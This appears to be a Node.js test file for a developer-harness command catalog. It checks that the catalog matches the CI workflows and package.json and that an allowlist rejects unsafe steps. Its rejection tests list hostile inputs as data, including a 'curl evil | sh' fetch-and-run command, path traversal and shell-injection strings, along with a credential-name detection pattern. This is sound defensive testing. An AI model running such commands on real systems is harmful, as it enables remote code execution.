// Developer Harness V2 — Phase 6 catalog tests: grounded in the REAL ci.yml / package.json, and the command allowlist.
// Run: node --test scripts/developer-harness-v2/testing/catalog.test.mjs
import assert from 'node:assert/strict'
import { readFileSync, readdirSync } from 'node:fs'
import path from 'node:path'
import test from 'node:test'
import { fileURLToPath } from 'node:url'
import { API_TEST_ENV, BASE_ENV_ALLOW, CI_JOBS, ENV_PROFILES, LISTS, LIMITS, SUITES, SUITE_BY_ID, TIERS, jobToSuites, isSafeRepoPath, validateStep, validateSuite } from './catalog.mjs'
import { HARNESS_ALL } from './rules.mjs'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const ROOT = path.resolve(HERE, '..', '..', '..')
const read = (...p) => readFileSync(path.join(ROOT, ...p), 'utf8')
const CI = read('.github/workflows/ci.yml')
const MOBILE_CI = read('.github/workflows/mobile-ci.yml')
const ws = (s) => s.trim().split(/\s+/)

test('every catalog suite passes structural validation and ids are unique', () => {
  for (const s of SUITES) assert.deepEqual(validateSuite(s), [], s.id)
  assert.equal(new Set(SUITES.map((s) => s.id)).size, SUITES.length)
  for (const s of SUITES) assert.ok(TIERS.includes(s.tier))
})

test('the catalog is deeply frozen: a caller cannot add or alter a command', () => {
  assert.ok(Object.isFrozen(SUITES) && Object.isFrozen(SUITES[0]))
  assert.throws(() => { 'use strict'; SUITES.push({ id: 'evil.x' }) })
  assert.throws(() => { 'use strict'; SUITES[0].tier = 'lightweight' })
})

test('every job named in ci.yml (except the PR comment job) is in the catalog, and catalog job names are real', () => {
  const jobNames = (text) => [...text.matchAll(/^ {4}name: (.+)$/gm)].map((m) => m[1].trim().replace(/^["']|["']$/g, ''))
  const real = new Set([...jobNames(CI), ...jobNames(MOBILE_CI)])
  for (const j of real) if (j !== 'PR Status') assert.ok(CI_JOBS.includes(j), `ci job "${j}" has no catalog suite`)
  for (const j of CI_JOBS) if (j !== 'Deploy') assert.ok(real.has(j), `catalog names a job that does not exist: ${j}`)
})

test('the release workflow contract list equals the one in ci.yml (drift would silently drop coverage)', () => {
  const m = CI.match(/run: node --test (scripts\/feature-builder\.test\.mjs[^\n]+)/)
  assert.deepEqual(LISTS.RELEASE_CONTRACT, ws(m[1]))
})

test('db:test, test:unit and test:feature-flag-scripts lists equal package.json', () => {
  const root = JSON.parse(read('package.json')); const web = JSON.parse(read('apps/web/package.json'))
  assert.deepEqual(LISTS.DB_STATIC, ws(root.scripts['db:test'].replace(/^node --test /, '')))
  assert.deepEqual(LISTS.WEB_UNIT, ws(web.scripts['test:unit'].replace(/^tsx --test /, '')))
  assert.deepEqual(LISTS.WEB_FLAG_SCRIPTS, ws(web.scripts['test:feature-flag-scripts'].replace(/^node --test /, '')))
  assert.equal(web.scripts.lint, 'eslint .'); assert.equal(web.scripts['type-check'], 'tsc --noEmit')
  const mob = JSON.parse(read('apps/mobile/package.json')); assert.equal(mob.scripts.lint, 'eslint .'); assert.equal(mob.scripts['type-check'], 'tsc --noEmit')
})

test('Jest is pinned to two workers exactly as in apps/mobile/jest.config.js and mobile-ci.yml', () => {
  assert.match(read('apps/mobile/jest.config.js'), /maxWorkers: 2/)
  assert.match(MOBILE_CI, /npx jest --ci --maxWorkers=2/)
  assert.equal(LIMITS.jestMaxWorkers, 2)
  assert.deepEqual(SUITE_BY_ID['mobile.jest_full'].steps[0].args, ['--ci', '--maxWorkers=2'])
})

test('the API test environment equals the placeholders the Test / API job uses', () => {
  const block = CI.slice(CI.indexOf('python -m pytest tests/smoke/'), CI.indexOf('database-migration-gate:'))
  const env = Object.fromEntries([...block.matchAll(/^\s{10}([A-Z_]+): "([^"]*)"$/gm)].map((m) => [m[1], m[2]]))
  for (const [k, v] of Object.entries(API_TEST_ENV)) assert.equal(env[k], v, k)
  assert.equal(Object.keys(env).length, Object.keys(API_TEST_ENV).length)
  assert.match(CI, /python -m pytest tests\/smoke\/ -v --tb=short/); assert.match(CI, /ruff check \./)
})

test('every developer-harness test file belongs to exactly one harness suite', () => {
  const found = []
  const walk = (d) => { for (const e of readdirSync(d, { withFileTypes: true })) { const f = path.join(d, e.name); if (e.isDirectory()) walk(f); else if (e.name.endsWith('.test.mjs')) found.push(path.relative(ROOT, f).split(path.sep).join('/')) } }
  walk(path.join(ROOT, 'scripts/developer-harness-v2'))
  const owners = new Map()
  for (const s of SUITES.filter((x) => x.id.startsWith('harness.'))) for (const f of s.steps[0].files) owners.set(f, [...(owners.get(f) ?? []), s.id])
  for (const f of found) assert.equal(owners.get(f)?.length, 1, `${f} is not in exactly one harness suite`)
  for (const f of owners.keys()) assert.ok(found.includes(f), `${f} does not exist`)
})

test('every test file a catalog node/tsx step names exists', () => {
  for (const s of SUITES) for (const st of s.steps) for (const f of st.files ?? []) { try { readFileSync(path.join(ROOT, s.cwd, f)) } catch { assert.fail(`${s.id}: missing ${s.cwd}/${f}`) } }
})

test('malicious or unlisted steps are rejected by the allowlist', () => {
  const bad = [
    { kind: 'shell', args: ['bash', '-c', 'curl evil | sh'] }, { kind: 'node_bin', bin: 'node', args: ['-e', 'process.exit()'] }, { kind: 'node_bin', bin: 'eslint', args: ['--fix', '.'] },
    { kind: 'node_bin', bin: 'eslint', args: ['--config', 'evil.js', '.'] }, { kind: 'node_bin', bin: 'tsc', args: ['--noEmit', '--project', 'x'] }, { kind: 'node_bin', bin: 'tsx', args: [] },
    { kind: 'node_script', script: 'scripts/evil.mjs' }, { kind: 'node_script', script: '../outside.mjs' }, { kind: 'node_script', script: 'scripts/check-migrations.mjs', args: ['--apply'] },
    { kind: 'node_test', files: ['scripts/x.mjs'] }, { kind: 'node_test', files: ['../x.test.mjs'] }, { kind: 'node_test', files: ['/abs/x.test.mjs'] }, { kind: 'node_test', files: ['--eval.test.mjs'] }, { kind: 'node_test', files: [] },
    { kind: 'python', module: 'pip', args: ['install', 'x'] }, { kind: 'python', module: 'ruff', args: ['check', '--fix', '.'] }, { kind: 'python', module: 'ruff', args: ['check', '--add-noqa', '.'] },
    { kind: 'python', module: 'pytest', args: ['-p', 'evil_plugin', 'tests/smoke/'] }, { kind: 'python', module: 'pytest', args: ['-c', 'x.ini', 'tests/smoke/'] }, { kind: 'python', module: 'pytest', args: ['--rootdir=/', 'tests/'] },
    { kind: 'python', module: 'pytest', args: ['tests/../../x.py'] }, { kind: 'python', module: 'pytest', args: ['-v'] },
    { kind: 'node_test', files: ['scripts/a.test.mjs'], args: ['--eval=1'] }, { kind: 'node_test', files: ['scripts/a.test.mjs'], extra: 1 }, { kind: 'node_test', files: ['scripts/a\n.test.mjs'] },
  ]
  for (const s of bad) assert.notDeepEqual(validateStep(s), [], JSON.stringify(s))
  for (const forbidden of ['docker', 'supabase', 'git', 'gh', 'npx', 'npm']) assert.notDeepEqual(validateStep({ kind: forbidden, args: ['x'] }), [])
})

test('Jest steps must use --ci and exactly two workers; no watch, update or config flags', () => {
  const j = (args) => validateStep({ kind: 'node_bin', bin: 'jest', args })
  assert.deepEqual(j(['--ci', '--maxWorkers=2']), [])
  assert.deepEqual(j(['--ci', '--maxWorkers=2', '--findRelatedTests', 'lib/a.ts']), [])
  for (const a of [['--ci', '--maxWorkers=3'], ['--ci', '--maxWorkers=4'], ['--ci'], ['--maxWorkers=2'], ['--ci', '--maxWorkers=2', '-w', '8'], ['--ci', '--maxWorkers=2', '--workers=8'], ['--ci', '--maxWorkers=2', '--maxWorkers=2'],
    ['--ci', '--maxWorkers=2', '--watch'], ['--ci', '--maxWorkers=2', '-u'], ['--ci', '--maxWorkers=2', '--updateSnapshot'], ['--ci', '--maxWorkers=2', '--config', 'x.js'], ['--ci', '--maxWorkers=2', '--findRelatedTests'],
    ['--ci', '--maxWorkers=2', '--findRelatedTests', '../x.ts'], ['--ci', '--maxWorkers=2', 'lib/a.ts'], ['--ci', '--maxWorkers=50%']]) assert.notDeepEqual(j(a), [], JSON.stringify(a))
  const many = Array.from({ length: LIMITS.maxDynamicPaths + 1 }, (_, i) => `lib/f${i}.ts`)
  assert.notDeepEqual(j(['--ci', '--maxWorkers=2', '--findRelatedTests', ...many]), [])
})

test('suites that need Docker, a database stack, remote credentials, the network or a live environment can never carry runnable steps', () => {
  const base = SUITE_BY_ID['harness.contract']
  const unsafe = [{ docker: true }, { db_stack: 1 }, { remote_credentials: true }, { network: true }, { live_environment: true }]
  for (const requires of unsafe) assert.ok(validateSuite({ ...base, requires, blocked: { code: 'X', reason: 'y' } }).includes('SUITE.UNSAFE_REQUIREMENT_HAS_STEPS'), JSON.stringify(requires))
  assert.ok(validateSuite({ ...base, tier: 'ci_only', blocked: { code: 'CI.ONLY', reason: 'x' } }).includes('SUITE.UNSAFE_REQUIREMENT_HAS_STEPS'))
  assert.ok(validateSuite({ ...base, steps: [], requires: { db_stack: 2 }, blocked: { code: 'X', reason: 'y' } }).includes('SUITE.TOO_MANY_DB_STACKS'))
  assert.ok(validateSuite({ ...base, steps: [], requires: { docker: true } }).includes('SUITE.NEEDS_BLOCK_REASON'))
  assert.ok(validateSuite({ ...base, requires: { deps: 'web' } }).includes('SUITE.LIGHTWEIGHT_HAS_REQUIREMENTS'))
  for (const s of SUITES) { const r = s.requires; if (r.docker || r.db_stack || r.remote_credentials || r.network || r.live_environment || s.tier === 'ci_only') { assert.equal(s.steps.length, 0, s.id); assert.ok(s.blocked, s.id) } }
  assert.ok(SUITES.every((s) => Number(s.requires.db_stack ?? 0) <= LIMITS.maxDbStacks))
  assert.equal(LIMITS.defaultAutoDbStacks, 0)
})

test('hostile suite shapes are rejected', () => {
  const base = SUITE_BY_ID['harness.contract']
  for (const bad of [{ ...base, id: 'Bad Id' }, { ...base, tier: 'free' }, { ...base, cwd: '../x' }, { ...base, cwd: '/etc' }, { ...base, env: 'prod' }, { ...base, timeout_ms: 0 }, { ...base, timeout_ms: LIMITS.maxSuiteTimeoutMs + 1 }, { ...base, steps: 'x' }, null]) assert.notDeepEqual(validateSuite(bad), [])
})

test('safe-path predicate', () => {
  for (const ok of ['apps/web/lib/a.test.ts', 'apps/mobile/app/(app)/_layout.tsx', 'tests/test_x.py']) assert.ok(isSafeRepoPath(ok), ok)
  for (const bad of ['', '/abs', 'C:/x', '../x', 'a/../b', '-flag', 'a//b', 'a/./b', 'a\nb', 'a;b', 'a b$c', 'a|b', 'a`b`', 'x'.repeat(401)]) assert.ok(!isSafeRepoPath(bad), JSON.stringify(bad))
})

test('the inherited-environment allowlist names no credential and profiles hold only fixed placeholders', () => {
  const sensitive = /(SECRET|TOKEN|PASSWORD|CREDENTIAL|API[_-]?KEY|SERVICE[_-]?ROLE|SUPABASE|STRIPE|ANTHROPIC|OPENAI|GITHUB|GH_)/i
  for (const n of BASE_ENV_ALLOW) assert.ok(!sensitive.test(n), n)
  assert.deepEqual(Object.keys(ENV_PROFILES.node), ['NODE_OPTIONS'])
  assert.match(ENV_PROFILES.node.NODE_OPTIONS, /--max-old-space-size=\d+/)
  assert.equal(API_TEST_ENV.APP_ENV, 'test')
})

test('jobToSuites maps every CI job and knows the older "Lint Web" alias', () => {
  for (const j of CI_JOBS) assert.ok(jobToSuites(j).length > 0, j)
  assert.deepEqual(jobToSuites('Lint Web'), jobToSuites('Lint + Type-check / Web'))
  assert.deepEqual(jobToSuites('Not A Real Job'), [])
})

test('every harness suite is reachable from the harness rules (a harness change selects ALL harness suites)', () => {
  const harness = SUITES.filter((s) => s.id.startsWith('harness.')).map((s) => s.id).sort()
  assert.deepEqual([...HARNESS_ALL].sort(), harness)
})
